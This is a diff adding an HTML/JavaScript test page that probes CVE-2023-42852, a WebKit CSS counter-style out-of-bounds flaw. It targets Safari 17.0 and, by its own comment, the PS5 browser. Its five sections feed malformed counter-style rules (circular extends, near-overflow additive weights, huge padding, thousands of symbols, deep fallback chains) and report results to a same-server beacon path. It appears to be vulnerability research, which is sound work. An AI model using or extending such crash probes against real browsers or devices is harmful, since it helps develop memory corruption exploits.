@@ -1,0 +1,236 @@
+<!--
+  p688: CVE-2023-42852 -- CSS counter-style system OOB write
+
+  CVE-2023-42852: "A logic issue was addressed with improved checks." Safari 17.1
+  fix. Present in 17.0 (605.1.15). PS5 LIKELY VULNERABLE.
+
+  This probe focuses on @counter-style with the 'extends' system and 'additive'
+  system, which have different code paths than p687's numeric/cyclic tests.
+  The additive tuple processing and fallback chain resolution are areas where
+  missing bounds checks could produce OOB access.
+
+  Patterns tested:
+  A) @counter-style extends chain with circular reference
+  B) Additive system with 2^31-1 weight values
+  C) @counter-style with pad that produces extremely long strings
+  D) symbols() function with extreme symbol count in list-style-type
+  E) @counter-style fallback chain depth (deeply nested fallback)
+
+  CRASH_CLASS: MODERATE (potential OOB from integer overflow in counter formatting)
+  prior art: p687 (CSS calc overflow), p615 (MetadataTable overflow)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p688</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+
+function main(){
+  b('P688-START:CVE-2023-42852-COUNTERSTYLE-OOB');
+  var results = [];
+
+  // === SECTION A: Circular extends chain ===
+  b('A:CIRCULAR-EXTENDS');
+  try {
+    var style = document.createElement('style');
+    style.textContent = [
+      '@counter-style loop1 { system: extends loop2; symbols: "A"; }',
+      '@counter-style loop2 { system: extends loop3; symbols: "B"; }',
+      '@counter-style loop3 { system: extends loop1; symbols: "C"; }',
+    ].join('\n');
+    document.head.appendChild(style);
+
+    var ol = document.createElement('ol');
+    ol.style.listStyleType = 'loop1';
+    for (var i = 0; i < 5; i++) {
+      var li = document.createElement('li');
+      li.textContent = 'circular-' + i;
+      ol.appendChild(li);
+    }
+    document.body.appendChild(ol);
+    ol.getBoundingClientRect();
+    b('A:CIRCULAR-RENDERED');
+
+    // Check if it fell back to decimal or crashed
+    var cs = getComputedStyle(ol);
+    b('A:LIST-STYLE:' + cs.listStyleType);
+    ol.remove();
+    style.remove();
+  } catch(e) {
+    b('A:ERR:' + e.message);
+    results.push('A:err');
+  }
+
+  // === SECTION B: Additive system with huge weights ===
+  b('B:ADDITIVE-HUGE');
+  try {
+    var style2 = document.createElement('style');
+    style2.textContent = [
+      '@counter-style huge-add {',
+      '  system: additive;',
+      '  additive-symbols: 2147483647 "MAX", 2147483646 "MAX-1", 1073741824 "HALF",',
+      '    536870912 "Q", 1 "one";',
+      '  range: 0 infinite;',
+      '}',
+    ].join('\n');
+    document.head.appendChild(style2);
+
+    var ol2 = document.createElement('ol');
+    ol2.style.listStyleType = 'huge-add';
+
+    // Test values near overflow boundaries
+    var testValues = [1, 100, 2147483647, 2147483646, 1073741824, 999999999];
+    for (var i = 0; i < testValues.length; i++) {
+      var li = document.createElement('li');
+      li.value = testValues[i];
+      li.textContent = 'val=' + testValues[i];
+      ol2.appendChild(li);
+    }
+    document.body.appendChild(ol2);
+    ol2.getBoundingClientRect();
+    b('B:ADDITIVE-RENDERED');
+
+    for (var i = 0; i < ol2.children.length; i++) {
+      var cs2 = getComputedStyle(ol2.children[i], '::marker');
+      b('B:MARKER-' + i + ':' + (cs2.content || 'none').substring(0, 40));
+    }
+
+    ol2.remove();
+    style2.remove();
+  } catch(e) {
+    b('B:ERR:' + e.message);
+    results.push('B:err');
+  }
+
+  // === SECTION C: Pad producing very long strings ===
+  b('C:PAD-LONG');
+  try {
+    var style3 = document.createElement('style');
+    style3.textContent = [
+      '@counter-style padded {',
+      '  system: numeric;',
+      '  symbols: "0" "1" "2" "3" "4" "5" "6" "7" "8" "9";',
+      '  pad: 100 "0";',  // 100-char minimum width
+      '}',
+    ].join('\n');
+    document.head.appendChild(style3);
+
+    var ol3 = document.createElement('ol');
+    ol3.style.listStyleType = 'padded';
+    ol3.style.width = '50px'; // narrow container
+    for (var i = 0; i < 5; i++) {
+      var li = document.createElement('li');
+      li.value = i;
+      li.textContent = 'padded';
+      ol3.appendChild(li);
+    }
+    document.body.appendChild(ol3);
+    ol3.getBoundingClientRect();
+    b('C:PAD-100-RENDERED');
+
+    // Try extreme pad value
+    style3.textContent = [
+      '@counter-style padded {',
+      '  system: numeric;',
+      '  symbols: "0" "1" "2" "3" "4" "5" "6" "7" "8" "9";',
+      '  pad: 10000 "X";',  // 10K char minimum
+      '}',
+    ].join('\n');
+    ol3.getBoundingClientRect();
+    b('C:PAD-10K-RENDERED');
+
+    ol3.remove();
+    style3.remove();
+  } catch(e) {
+    b('C:ERR:' + e.message);
+    results.push('C:err');
+  }
+
+  // === SECTION D: symbols() function with many symbols ===
+  b('D:SYMBOLS-FUNC');
+  try {
+    var div = document.createElement('div');
+    document.body.appendChild(div);
+
+    // Build a symbols() function with many entries
+    var syms = [];
+    for (var i = 0; i < 500; i++) {
+      syms.push('"s' + i + '"');
+    }
+    div.innerHTML = '<ol style="list-style-type: symbols(cyclic ' + syms.join(' ') + ')"><li>test</li></ol>';
+    div.getBoundingClientRect();
+    b('D:SYMBOLS-500-RENDERED');
+
+    // Try 2000 symbols
+    syms = [];
+    for (var i = 0; i < 2000; i++) {
+      syms.push('"' + String.fromCharCode(65 + (i % 26)) + i + '"');
+    }
+    try {
+      div.innerHTML = '<ol style="list-style-type: symbols(cyclic ' + syms.join(' ') + ')"><li>test2</li></ol>';
+      div.getBoundingClientRect();
+      b('D:SYMBOLS-2000-RENDERED');
+    } catch(e2) {
+      b('D:SYMBOLS-2000-ERR:' + e2.message);
+    }
+
+    div.remove();
+  } catch(e) {
+    b('D:ERR:' + e.message);
+    results.push('D:err');
+  }
+
+  // === SECTION E: Deep fallback chain ===
+  b('E:FALLBACK-CHAIN');
+  try {
+    var cssText = '';
+    // Build a chain of 50 counter styles each falling back to the next
+    for (var i = 0; i < 50; i++) {
+      var next = (i < 49) ? 'chain' + (i + 1) : 'decimal';
+      cssText += '@counter-style chain' + i + ' {\n';
+      cssText += '  system: fixed;\n';
+      cssText += '  symbols: "X' + i + '";\n';
+      cssText += '  range: ' + (i * 1000) + ' ' + (i * 1000 + 999) + ';\n';
+      cssText += '  fallback: ' + next + ';\n';
+      cssText += '}\n';
+    }
+
+    var style5 = document.createElement('style');
+    style5.textContent = cssText;
+    document.head.appendChild(style5);
+
+    var ol5 = document.createElement('ol');
+    ol5.style.listStyleType = 'chain0';
+    // Values that force traversal through the chain
+    for (var i = 0; i < 10; i++) {
+      var li = document.createElement('li');
+      li.value = i * 5000 + 500; // hits different chain levels
+      li.textContent = 'chain-' + i;
+      ol5.appendChild(li);
+    }
+    document.body.appendChild(ol5);
+    ol5.getBoundingClientRect();
+    b('E:CHAIN-50-RENDERED');
+
+    for (var i = 0; i < ol5.children.length; i++) {
+      var cs5 = getComputedStyle(ol5.children[i], '::marker');
+      b('E:MARKER-' + i + ':' + (cs5.content || 'none').substring(0, 30));
+    }
+
+    ol5.remove();
+    style5.remove();
+  } catch(e) {
+    b('E:ERR:' + e.message);
+    results.push('E:err');
+  }
+
+  // === SUMMARY ===
+  if (results.length > 0) {
+    b('P688-RESULT:HITS=' + results.join(';'));
+  } else {
+    b('P688-RESULT:NO-OOB-DETECTED');
+  }
+  b('P688-DONE');
+}
+
+setTimeout(main, 200);
+</script>
+</head><body style="margin:0"><pre id="log">p688: CSS counter-style system OOB</pre></body></html>
